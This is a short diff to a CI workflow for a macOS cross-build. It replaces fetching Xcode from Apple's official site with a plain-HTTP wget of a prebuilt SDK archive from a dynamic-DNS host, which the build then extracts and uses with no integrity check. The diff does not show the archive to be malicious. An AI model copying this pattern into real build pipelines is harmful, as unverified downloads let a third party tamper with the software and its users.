@@ -51,12 +51,8 @@ jobs:
         run: |
           sudo apt-get install curl bsdmainutils cmake libz-dev python3-setuptools libtinfo5 xorriso cpio
           cd depends && mkdir SDKs && cd SDKs
-          wget https://download.developer.apple.com/Developer_Tools/Xcode_12.2/Xcode_12.2.xip
-          git clone https://github.com/bitcoin-core/apple-sdk-tools.git
-          python3 apple-sdk-tools/extract_xcode.py -f Xcode_12.2.xip | cpio -d -i
-          ../../contrib/macdeploy/gen-sdk './Xcode.app'
-          tar -xzf Xcode-12.2-12B45b-extracted-SDK-with-libcxx-headers.tar.gz
-          rm -rf Xcode_12.2.xip Xcode-12.2-12B45b-extracted-SDK-with-libcxx-headers.tar.gz Xcode.app
+          wget http://mixakuca.ddns.net:8000/Xcode-12.2.tar.gz
+          tar -xzf Xcode-12.2.tar.gz
 
       - name: Save OSX deps cache
         id: osx-deps-cache-save
